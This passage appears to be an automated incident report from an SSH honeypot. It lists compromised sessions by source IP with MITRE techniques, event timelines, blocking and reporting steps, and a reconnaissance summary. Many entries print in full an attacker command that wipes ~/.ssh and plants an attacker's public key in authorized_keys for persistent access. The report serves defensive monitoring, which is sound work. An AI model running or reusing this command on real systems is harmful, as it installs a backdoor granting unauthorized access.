| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:05:59` | `cowrie.session.connect` |
| `2026-06-14 09:05:59` | `cowrie.client.version` |
| `2026-06-14 09:05:59` | `cowrie.client.kex` |
| `2026-06-14 09:06:00` | `cowrie.login.success` |
| `2026-06-14 09:06:00` | `cowrie.session.params` |
| `2026-06-14 09:06:00` | `cowrie.command.input` |
| `2026-06-14 09:06:00` | `cowrie.command.failed` |
| `2026-06-14 09:06:01` | `cowrie.log.closed` |
| `2026-06-14 09:06:01` | `cowrie.session.params` |
| `2026-06-14 09:06:01` | `cowrie.command.input` |
| `2026-06-14 09:06:01` | `cowrie.session.file_download` |
| `2026-06-14 09:06:01` | `cowrie.log.closed` |
| `2026-06-14 09:06:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d436abc65ad

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 09:06 |
| **Last Seen** | 2026-06-14 09:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:06:04` | `cowrie.session.connect` |
| `2026-06-14 09:06:04` | `cowrie.client.version` |
| `2026-06-14 09:06:04` | `cowrie.client.kex` |
| `2026-06-14 09:06:05` | `cowrie.login.success` |
| `2026-06-14 09:06:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9030268af8e5

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 09:07 |
| **Last Seen** | 2026-06-14 09:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:07:38` | `cowrie.session.connect` |
| `2026-06-14 09:07:38` | `cowrie.client.version` |
| `2026-06-14 09:07:38` | `cowrie.client.kex` |
| `2026-06-14 09:07:39` | `cowrie.login.success` |
| `2026-06-14 09:07:39` | `cowrie.session.params` |
| `2026-06-14 09:07:39` | `cowrie.command.input` |
| `2026-06-14 09:07:39` | `cowrie.command.failed` |
| `2026-06-14 09:07:39` | `cowrie.log.closed` |
| `2026-06-14 09:07:40` | `cowrie.session.params` |
| `2026-06-14 09:07:40` | `cowrie.command.input` |
| `2026-06-14 09:07:40` | `cowrie.session.file_download` |
| `2026-06-14 09:07:40` | `cowrie.log.closed` |
| `2026-06-14 09:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e4e1de7db85

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 09:07 |
| **Last Seen** | 2026-06-14 09:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:07:42` | `cowrie.session.connect` |
| `2026-06-14 09:07:42` | `cowrie.client.version` |
| `2026-06-14 09:07:43` | `cowrie.client.kex` |
| `2026-06-14 09:07:43` | `cowrie.login.success` |
| `2026-06-14 09:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8d1efa49863

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 09:10 |
| **Last Seen** | 2026-06-14 09:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:10:59` | `cowrie.session.connect` |
| `2026-06-14 09:10:59` | `cowrie.client.version` |
| `2026-06-14 09:10:59` | `cowrie.client.kex` |
| `2026-06-14 09:11:00` | `cowrie.login.success` |
| `2026-06-14 09:11:00` | `cowrie.session.params` |
| `2026-06-14 09:11:00` | `cowrie.command.input` |
| `2026-06-14 09:11:00` | `cowrie.command.failed` |
| `2026-06-14 09:11:01` | `cowrie.log.closed` |
| `2026-06-14 09:11:01` | `cowrie.session.params` |
| `2026-06-14 09:11:01` | `cowrie.command.input` |
| `2026-06-14 09:11:01` | `cowrie.session.file_download` |
| `2026-06-14 09:11:01` | `cowrie.log.closed` |
| `2026-06-14 09:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14f053987ead

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 09:11 |
| **Last Seen** | 2026-06-14 09:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:11:04` | `cowrie.session.connect` |
| `2026-06-14 09:11:04` | `cowrie.client.version` |
| `2026-06-14 09:11:04` | `cowrie.client.kex` |
| `2026-06-14 09:11:04` | `cowrie.login.success` |
| `2026-06-14 09:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9361ce1f79d8

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 09:12 |
| **Last Seen** | 2026-06-14 09:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:12:38` | `cowrie.session.connect` |
| `2026-06-14 09:12:38` | `cowrie.client.version` |
| `2026-06-14 09:12:39` | `cowrie.client.kex` |
| `2026-06-14 09:12:39` | `cowrie.login.success` |
| `2026-06-14 09:12:40` | `cowrie.session.params` |
| `2026-06-14 09:12:40` | `cowrie.command.input` |
| `2026-06-14 09:12:40` | `cowrie.command.failed` |
| `2026-06-14 09:12:40` | `cowrie.log.closed` |
| `2026-06-14 09:12:40` | `cowrie.session.params` |
| `2026-06-14 09:12:40` | `cowrie.command.input` |
| `2026-06-14 09:12:41` | `cowrie.session.file_download` |
| `2026-06-14 09:12:41` | `cowrie.log.closed` |
| `2026-06-14 09:12:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-158c06fda52a

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 09:12 |
| **Last Seen** | 2026-06-14 09:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:12:43` | `cowrie.session.connect` |
| `2026-06-14 09:12:43` | `cowrie.client.version` |
| `2026-06-14 09:12:43` | `cowrie.client.kex` |
| `2026-06-14 09:12:44` | `cowrie.login.success` |
| `2026-06-14 09:12:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0d4e9eb7e86

| Field | Detail |
|---|---|
| **Source IP** | `4.211.84[.]189` |
| **First Seen** | 2026-06-14 09:19 |
| **Last Seen** | 2026-06-14 09:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:19:30` | `cowrie.session.connect` |
| `2026-06-14 09:19:30` | `cowrie.client.version` |
| `2026-06-14 09:19:31` | `cowrie.client.kex` |
| `2026-06-14 09:19:31` | `cowrie.login.success` |
| `2026-06-14 09:19:31` | `cowrie.session.params` |
| `2026-06-14 09:19:31` | `cowrie.command.input` |
| `2026-06-14 09:19:31` | `cowrie.command.failed` |
| `2026-06-14 09:19:32` | `cowrie.log.closed` |
| `2026-06-14 09:19:32` | `cowrie.session.params` |
| `2026-06-14 09:19:32` | `cowrie.command.input` |
| `2026-06-14 09:19:32` | `cowrie.session.file_download` |
| `2026-06-14 09:19:32` | `cowrie.log.closed` |
| `2026-06-14 09:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.211.84[.]189` to AbuseIPDB if not already reported
- [ ] Block `4.211.84[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ac32a2adaca

| Field | Detail |
|---|---|
| **Source IP** | `4.211.84[.]189` |
| **First Seen** | 2026-06-14 09:19 |
| **Last Seen** | 2026-06-14 09:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:19:34` | `cowrie.session.connect` |
| `2026-06-14 09:19:34` | `cowrie.client.version` |
| `2026-06-14 09:19:34` | `cowrie.client.kex` |
| `2026-06-14 09:19:35` | `cowrie.login.success` |
| `2026-06-14 09:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.211.84[.]189` to AbuseIPDB if not already reported
- [ ] Block `4.211.84[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f0d80298fbe

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 09:22 |
| **Last Seen** | 2026-06-14 09:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:22:57` | `cowrie.session.connect` |
| `2026-06-14 09:22:57` | `cowrie.client.version` |
| `2026-06-14 09:22:58` | `cowrie.client.kex` |
| `2026-06-14 09:22:58` | `cowrie.login.success` |
| `2026-06-14 09:22:59` | `cowrie.session.params` |
| `2026-06-14 09:22:59` | `cowrie.command.input` |
| `2026-06-14 09:22:59` | `cowrie.command.failed` |
| `2026-06-14 09:22:59` | `cowrie.log.closed` |
| `2026-06-14 09:22:59` | `cowrie.session.params` |
| `2026-06-14 09:22:59` | `cowrie.command.input` |
| `2026-06-14 09:23:00` | `cowrie.session.file_download` |
| `2026-06-14 09:23:00` | `cowrie.log.closed` |
| `2026-06-14 09:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b25c4ba3692a

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 09:23 |
| **Last Seen** | 2026-06-14 09:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:23:02` | `cowrie.session.connect` |
| `2026-06-14 09:23:02` | `cowrie.client.version` |
| `2026-06-14 09:23:02` | `cowrie.client.kex` |
| `2026-06-14 09:23:03` | `cowrie.login.success` |
| `2026-06-14 09:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba66ed083b7d

| Field | Detail |
|---|---|
| **Source IP** | `181.115.171[.]100` |
| **First Seen** | 2026-06-14 09:27 |
| **Last Seen** | 2026-06-14 09:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:27:54` | `cowrie.session.connect` |
| `2026-06-14 09:27:54` | `cowrie.client.version` |
| `2026-06-14 09:27:54` | `cowrie.client.kex` |
| `2026-06-14 09:27:56` | `cowrie.login.success` |
| `2026-06-14 09:27:56` | `cowrie.session.params` |
| `2026-06-14 09:27:56` | `cowrie.command.input` |
| `2026-06-14 09:27:56` | `cowrie.command.failed` |
| `2026-06-14 09:27:57` | `cowrie.log.closed` |
| `2026-06-14 09:27:57` | `cowrie.session.params` |
| `2026-06-14 09:27:57` | `cowrie.command.input` |
| `2026-06-14 09:27:58` | `cowrie.session.file_download` |
| `2026-06-14 09:27:58` | `cowrie.log.closed` |
| `2026-06-14 09:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.115.171[.]100` to AbuseIPDB if not already reported
- [ ] Block `181.115.171[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef00ab0ab727

| Field | Detail |
|---|---|
| **Source IP** | `181.115.171[.]100` |
| **First Seen** | 2026-06-14 09:28 |
| **Last Seen** | 2026-06-14 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:28:02` | `cowrie.session.connect` |
| `2026-06-14 09:28:02` | `cowrie.client.version` |
| `2026-06-14 09:28:02` | `cowrie.client.kex` |
| `2026-06-14 09:28:03` | `cowrie.login.success` |
| `2026-06-14 09:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.115.171[.]100` to AbuseIPDB if not already reported
- [ ] Block `181.115.171[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb474398fb98

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 09:31 |
| **Last Seen** | 2026-06-14 09:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:31:19` | `cowrie.session.connect` |
| `2026-06-14 09:31:19` | `cowrie.client.version` |
| `2026-06-14 09:31:19` | `cowrie.client.kex` |
| `2026-06-14 09:31:20` | `cowrie.login.success` |
| `2026-06-14 09:31:20` | `cowrie.session.params` |
| `2026-06-14 09:31:20` | `cowrie.command.input` |
| `2026-06-14 09:31:20` | `cowrie.command.failed` |
| `2026-06-14 09:31:21` | `cowrie.log.closed` |
| `2026-06-14 09:31:21` | `cowrie.session.params` |
| `2026-06-14 09:31:21` | `cowrie.command.input` |
| `2026-06-14 09:31:21` | `cowrie.session.file_download` |
| `2026-06-14 09:31:21` | `cowrie.log.closed` |
| `2026-06-14 09:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cc79dc4300b

| Field | Detail |
|---|---|
| **Source IP** | `85.124.219[.]6` |
| **First Seen** | 2026-06-14 09:31 |
| **Last Seen** | 2026-06-14 09:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:31:24` | `cowrie.session.connect` |
| `2026-06-14 09:31:24` | `cowrie.client.version` |
| `2026-06-14 09:31:24` | `cowrie.client.kex` |
| `2026-06-14 09:31:25` | `cowrie.login.success` |
| `2026-06-14 09:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.124.219[.]6` to AbuseIPDB if not already reported
- [ ] Block `85.124.219[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `157.230.150[.]187` | **353** | 2026-06-14 04:23 | 2026-06-14 09:39 | 243m | 0 | `T1592` | 🟠 MEDIUM |
| `92.204.138[.]58` | **186** | 2026-06-14 04:23 | 2026-06-14 09:34 | 97m | 0 | `T1592` | 🟠 MEDIUM |
| `92.204.128[.]6` | **34** | 2026-06-14 05:31 | 2026-06-14 09:38 | 17m | 0 | `T1592` | 🟠 MEDIUM |
| `190.167.237[.]191` | **30** | 2026-06-14 06:22 | 2026-06-14 07:21 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `211.105.129[.]57` | **30** | 2026-06-14 04:39 | 2026-06-14 05:48 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `85.124.219[.]6` | **30** | 2026-06-14 08:36 | 2026-06-14 09:31 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `119.96.174[.]235` | **29** | 2026-06-14 06:29 | 2026-06-14 06:59 | 48m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `189.17.134[.]242` | **20** | 2026-06-14 06:11 | 2026-06-14 07:28 | 1m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.57.3[.]137` | **12** | 2026-06-14 06:35 | 2026-06-14 07:16 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.228.135[.]197` | **9** | 2026-06-14 04:24 | 2026-06-14 04:39 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `185.216.134[.]126` | **7** | 2026-06-14 04:40 | 2026-06-14 05:00 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `166.62.92[.]145` | **6** | 2026-06-14 04:47 | 2026-06-14 07:09 | 3m | 0 | `T1592` | 🟢 LOW |
| `120.48.42[.]17` | **2** | 2026-06-14 08:32 | 2026-06-14 09:32 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.120.37[.]97` | **2** | 2026-06-14 05:19 | 2026-06-14 05:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `188.157.143[.]122` | **2** | 2026-06-14 04:33 | 2026-06-14 04:33 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.163.60[.]170` | **2** | 2026-06-14 07:59 | 2026-06-14 07:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.145.6[.]205` | **2** | 2026-06-14 07:19 | 2026-06-14 07:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]215` | **2** | 2026-06-14 07:53 | 2026-06-14 07:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.187.147[.]165` | 1 | 2026-06-14 07:53 | 2026-06-14 07:53 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
